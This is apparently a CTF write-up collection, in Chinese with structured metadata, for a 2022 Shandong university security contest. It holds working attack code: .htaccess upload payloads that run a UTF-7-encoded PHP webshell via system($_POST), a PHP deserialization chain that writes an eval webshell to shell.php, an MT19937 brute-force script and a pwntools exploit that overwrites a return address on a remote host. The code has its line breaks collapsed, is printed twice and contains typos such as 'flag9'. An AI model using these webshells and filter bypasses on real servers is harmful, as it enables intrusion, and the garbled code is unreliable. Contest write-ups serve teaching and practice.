---
title: 第六届山东省大学生电子设计大赛——网络安全技能竞赛
contest: 山东省大学生电子设计大赛
year: 2022
difficulty: medium
vuln_type: deserialize
tags:
- Web-upload
- .htaccess
- UTF-7编码
- 加换行绕关键字
- 反序列化
- 成员数绕__wakeup
- MT19937
- mt_recover
- DSA
- AntSword流量
- RGB转二维码
- ezxor
- arbitrary
attack_chain: 'upload_100: 仅能上传.htaccess→开头#define width 1337+height 1337设文件大小→<Files ~ "^.ht"> Require all granted+SetHandler application/x-httpd-php→UTF-7编码+ADw?+AD0-system...绕<?=过滤+加换行绕关键字|pop_200: PHP5反序列化,File_operations/Show_index/Transfer/Exception_process链,str_replace(''O:1:"A":2'',''O:1:"A":3'')绕__wakeup成员数+写webshell|签到: 维吉尼亚→凯撒|三层base|mt: 32位素数flag+init(s)用1812433253 XOR+enc(y)四步XOR+逆recover+rrecover推回flag|easy: DSA r1=r2先求k再求flag|draw: 255/0 RGB转01串+PIL画400x400二维码|hacker: HTTP流找蚁剑流量+第147流zip+解压|ezxor: 输入38个a动态调试+随机数异或+与y异或|arbitrary: read(14)泄高codebase+read(15)低+write(-0x2)修改返回地址'
key_payload: '#define width 1337 + SetHandler application/x-httpd-php + UTF-7+ADw?+AD0-system|class Show_index->filepage(new Transfer)->method(new Transfer)->method(new File_operations)|for i in range(2^32, 2^31, -1): if gmpy2.is_prime(i): sstate = init(i); cc = enc(sstate[-1]); if cc == 1047573452: print(i)|h1,h2,s1,s2,r1,q → k = (h1*r2 - h2*r1) * invert(s1*r2 - s2*r1, q) % q, flag = (k*s1 - h1) * invert(r1, q) % q|read(14)+read(15) → codebase2*0x100000000+codebase-0xb17, write(-0x2, (codebase+0xa46)&0xffffffff)'
one_liner: 第六届山东省赛网安赛题合集(Web upload_100+pop_200+Crypto签到/Vigenere/凯撒/三层base/MT19937/DSA+Re ezxor+arbitrary+Misc draw+二维码+hacker蚁剑流量)
lesson: 1) .htaccess解析PHP:SetHandler application/x-httpd-php+UTF-7编码(+ADw?+AD0-system)+加换行绕关键字(如Fi+换行+les); 2) PHP5反序列化__wakeup成员数绕:str_replace('O:1:"A":2','O:1:"A":3'); 3) MT19937 32位素数init+enc:recover(inverse_right/left_mask逆4步)+rrecover(逆init推回s[0]); 4) DSA r1=r2已知:先求k=(h1*r2-h2*r1)*invert(s1*r2-s2*r1,q)%q再求flag; 5) 蚁剑流量第147流含zip,需hex提取; 6) 24-bit RGB转01:255=1/0=0; 7) arbitrary:read 14+15拼codebase,write(-0x2)修改返回地址为codebase+0xa46
quality: high
full_path: 第六届山东省大学生电子设计大赛——网络安全技能竞赛.full.md
meta_path: 第六届山东省大学生电子设计大赛——网络安全技能竞赛.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第六届山东省大学生电子设计大赛——网络安全技能竞赛。第六届山东省赛网安赛题合集(Web upload_100+pop_200+Crypto签到/Vigenere/凯撒/三层base/MT19937/DSA+Re ezxor+arbitrary+Misc draw+二维码+hacker蚁剑流量)。经验：1) .htaccess解析PHP:SetHandler application/x-htt...
category: web
subcategory: web_other
tools_used:
- Radare2
- gmpy2
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: school
wp_url: https://www.ctfiot.com/87624.html
wp_author: M1mikatz
reasoning_chain:
- 触发点：upload_100 只能上传 .htaccess → 假设：.htaccess 解析为 PHP
- 动作：上传 .htaccess 含 SetHandler application/x-httpd-php + Files allow from all → 观察：访问 .htaccess 触发 PHP 执行
- 假设：<?= 被过滤 → 动作：UTF-7 编码 +ADw?+AD0-system(+ACQAXw-POST...) → 观察：zend.multibyte+UTF-7 解析
- pop_200 反序列化触发点：Transfer.parameter 默认 webshell → 假设：POP 链触发 file_put_contents
- 动作：Show_index→Transfer(method=Transfer(method=File_operations(filename=shell.php))) → 观察：写 shell.php
- Crypto 签到：触发点：维吉尼亚 → 假设：key=classic 已知 → 动作：解 Vigenère
- MT19937 PRNG 预测：触发点：给 624 个输出 → 假设：可预测 state → 动作：python 逆 init/enc
- DSA 题：触发点 r1=r2 → 假设：共享 k → 动作：解线性方程
failed_attempts:
- upload_100 直接上传 .php → 失败：后缀过滤
- .htaccess 不设 multibyte 直接写 PHP → 失败：UTF-7 编码不被识别
- pop_200 直接 unserialize User → 失败：缺魔术方法触发链
key_observations:
- .htaccess SetHandler application/x-httpd-php + UTF-7 编码 = WAF 绕过 + PHP 解析
- POP 链触发 file_put_contents 写 webshell 是 PHP 反序列化常用 gadget
- Vigenère 已知 key 直接解密
- MT19937 给 624 个 32bit 输出 = 完全预测 state（不需全部 624）
prerequisites:
- .htaccess Apache 配置语法
- PHP UTF-7 编码 multibyte
- POP 反序列化 gadget 链构造
- MT19937 PRNG 状态恢复
---
# 第六届山东省大学生电子设计大赛——网络安全技能竞赛

> 原文: https://www.ctfiot.com/87624.html
> ID: 87624

第六届山东省大学生电子设计大赛——网络安全技能竞赛

Web

upload_100     –by M1mikatz

一个文件上传，只能上传 .htaccess：
image-20221223112409010

并且对文件内容进行过滤。并且upload目录下面没有php文件，因此考虑将 .htaccess 解析为 php文件使用。

注意，题目似乎对上传文件的尺寸做了限制，需要在 .htaccess 开头定义好大小。别问为什么，试出来的。。。。。。

#define width 1337#define height 1337

<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>

SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>

<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-phpphp_flag zend.multibyte 1php_value zend.script_encoding "UTF-7"# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

#define width 1337#define height 1337<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-phpphp_flag zend.multibyte 1php_value zend.script_encoding "UTF-7"# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4

<?phperror_reporting(0);
class File_operations { protected $filename='/var/www/html/shell.php';}
class Show_index { public $filepage;}
class Exception_process { public $arg;}

class Transfer { public $method; private $parameter = "<?php eval($_POST[a]);";}
$poc = new Show_index();$poc->filepage = new Transfer();$poc->filepage->method = new Transfer();$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));

from Crypto.Util.number import *

 flag = getPrime(32) def init(flag): s = [0] * 100 s[0] = flag for i in range(1, 100): s[i] = 0xFFFFFFFF & (1812433253 * (s[i - 1] ^ s[i - 1] >> 30) + i) return s
 state = init(flag) def enc(y): y = y ^ y >> 11 y = y ^ y << 7 & 2636928640 y = y ^ y << 15 & 4022730752 y = y ^ y >> 18 return y&0xffffffff
 c = enc(state[-1]) print(c)
 #1047573452

# -*-coding:
utf-8-*-
 from Crypto.Util.number import * import gmpy2 import tqdm

 def init(flag): s = [0] * 100 s[0] = flag9 for i in range(1, 100): s[i] = 0xFFFFFFFF & (1812433253 * (s[i - 1] ^ s[i - 1] >> 30) + i) return s def enc(y): y = y ^ y >> 11 y = y ^ y << 7 & 2636928640 y = y ^ y << 15 & 4022730752 y = y ^ y >> 18
 return y & 0xffffffff
 range1=pow(2,31) range2=pow(2,32) #逆序 for i in tqdm.trange(range2,range1,-1): #正序 #for i in tqdm.trange(range1,range2): if gmpy2.is_prime(i): sstate = init(i) cc = enc(sstate[-1]) if cc == 1047573452: print(i)
 break

Exp:
from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']context.log_level = 'debug'# r = process('/mnt/hgfs/ubuntu/4/arbitrary')r = remote('60.216.78.58',45721)
def menu(choice): r.recvuntil(b"??????. Shell!") r.sendline(str(choice))

def read(off): menu(1) r.sendline(str(off)) def write(off,value): menu(2) r.sendline(str(off)+" "+str(value)) read(14)r.recvuntil(b'Done! ')codebase = int(r.recvuntil(b'n')[:-1])read(15)r.recvuntil(b'Done! ')
codebase2 = int(r.recvuntil(b'n')[:-1])codebase = codebase2*0x100000000+codebase-0xb17write(-0x2,(codebase+0xa46)&0xffffffff)print(hex(codebase))
r.interactive()


```
    #define width 1337#define height 1337
<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>
SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-php
# <?=system($_POST[whoami]);?>
<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-phpphp_flag zend.multibyte 1php_value zend.script_encoding "UTF-7"# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
    #define width 1337#define height 1337<Files ~ "^.ht"> Require all granted Order allow,deny Allow from all</Files>SetHandler application/x-httpd-phpphp_flag zend.multibyte 1php_value zend.script_encoding "UTF-7"# +ADw?+AD0-system(+ACQAXw-POST+AFs-whoami+AF0)+ADs?+AD4
<?phperror_reporting(0);
class File_operations { protected $filename='/var/www/html/shell.php';}
class Show_index { public $filepage;}
class Exception_process { public $arg;}

class Transfer { public $method; private $parameter = "<?php eval($_POST[a]);";}
$poc = new Show_index();$poc->filepage = new Transfer();$poc->filepage->method = new Transfer();$poc->filepage->method->method = new File_operations();
echo urlencode(serialize($poc));
from Crypto.Util.number import *

 flag = getPrime(32) def init(flag): s = [0] * 100 s[0] = flag for i in range(1, 100): s[i] = 0xFFFFFFFF & (1812433253 * (s[i - 1] ^ s[i - 1] >> 30) + i) return s
 state = init(flag) def enc(y): y = y ^ y >> 11 y = y ^ y << 7 & 2636928640 y = y ^ y << 15 & 4022730752 y = y ^ y >> 18 return y&0xffffffff
 c = enc(state[-1]) print(c)
 #1047573452
# -*-coding:
utf-8-*-
 from Crypto.Util.number import * import gmpy2 import tqdm

 def init(flag): s = [0] * 100 s[0] = flag9 for i in range(1, 100): s[i] = 0xFFFFFFFF & (1812433253 * (s[i - 1] ^ s[i - 1] >> 30) + i) return s def enc(y): y = y ^ y >> 11 y = y ^ y << 7 & 2636928640 y = y ^ y << 15 & 4022730752 y = y ^ y >> 18
 return y & 0xffffffff
 range1=pow(2,31) range2=pow(2,32) #逆序 for i in tqdm.trange(range2,range1,-1): #正序 #for i in tqdm.trange(range1,range2): if gmpy2.is_prime(i): sstate = init(i) cc = enc(sstate[-1]) if cc == 1047573452: print(i)
 break
Exp:
from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']context.log_level = 'debug'# r = process('/mnt/hgfs/ubuntu/4/arbitrary')r = remote('60.216.78.58',45721)
def menu(choice): r.recvuntil(b"??????. Shell!") r.sendline(str(choice))

def read(off): menu(1) r.sendline(str(off)) def write(off,value): menu(2) r.sendline(str(off)+" "+str(value)) read(14)r.recvuntil(b'Done! ')codebase = int(r.recvuntil(b'n')[:-1])read(15)r.recvuntil(b'Done! ')
codebase2 = int(r.recvuntil(b'n')[:-1])codebase = codebase2*0x100000000+codebase-0xb17write(-0x2,(codebase+0xa46)&0xffffffff)print(hex(codebase))
r.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]